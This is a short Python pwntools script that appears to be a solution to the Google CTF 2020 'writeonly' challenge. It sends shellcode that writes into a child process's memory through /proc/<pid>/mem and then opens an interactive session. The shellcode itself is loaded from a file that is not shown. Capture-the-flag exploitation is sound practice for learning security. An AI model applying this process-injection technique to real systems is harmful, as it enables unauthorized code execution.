from pathlib import Path
from pwn import *

def main():
    arg = None
    if len(sys.argv) >= 2:
        arg = sys.argv[1]
    if not arg or sys.argv[1] != "remote":
        p = process("../chal")
        if arg == "debug":
            gdb.attach(p)
    else:
        p = remote("writeonly.2020.ctfcompetition.com", 1337)

    p.recvuntil("[DEBUG] child pid: ")
    child_pid = int(p.recvuntil("\n").strip())

    input("Waiting...")

    shellcode = Path("solution.shellcode").read_bytes()
    child_mem_path_placeholder = b"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
    child_mem_path = "/proc/{}/mem".format(child_pid).ljust(len(child_mem_path_placeholder), "\0").encode("utf-8")
    shellcode = shellcode.replace(child_mem_path_placeholder, child_mem_path)
    p.sendline("%d" % len(shellcode))
    p.send(shellcode)
    p.interactive()

if __name__ == "__main__":
    main()
